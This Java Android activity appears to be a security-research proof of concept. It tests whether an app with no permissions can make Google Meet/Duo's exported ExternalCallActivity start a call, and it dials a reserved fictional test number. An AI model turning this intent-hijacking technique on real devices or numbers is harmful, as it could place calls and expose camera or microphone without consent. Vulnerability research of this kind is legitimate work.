package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

// com.google.android.apps.tachyon (Google Meet/Duo) exports ExternalCallActivity
// (no permission) handling action "com.google.android.apps.tachyon.action.CALL"
// with intent.getData() = tel:<number>. Source review (kev.java/ket.java) shows a
// comment "Block legacy outgoing calls, redirect to meeting bottom sheet" -- testing
// whether a zero-perm app triggering this actually auto-connects a call (camera/mic
// risk) or merely navigates to a confirmation UI, using a reserved fictional test
// number (+1-555-0100, North American reserved-for-fiction range) so no real person
// is contacted either way.
public class TachyonExternalCallActivity extends Activity {
    private static final String T = "TACHYON_EXTCALL";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Tachyon ExternalCallActivity CALL-action probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        try {
            Intent intent = new Intent("com.google.android.apps.tachyon.action.CALL");
            intent.setData(Uri.parse("tel:+15555550100"));
            intent.setComponent(new ComponentName(
                "com.google.android.apps.tachyon",
                "com.google.android.apps.tachyon.externalcallactivity.ExternalCallActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Log.w(T, "[SENT] CALL action dispatched to ExternalCallActivity");
        } catch (Throwable e) {
            Log.w(T, "[FAILED] " + e);
        }
        finish();
    }
}
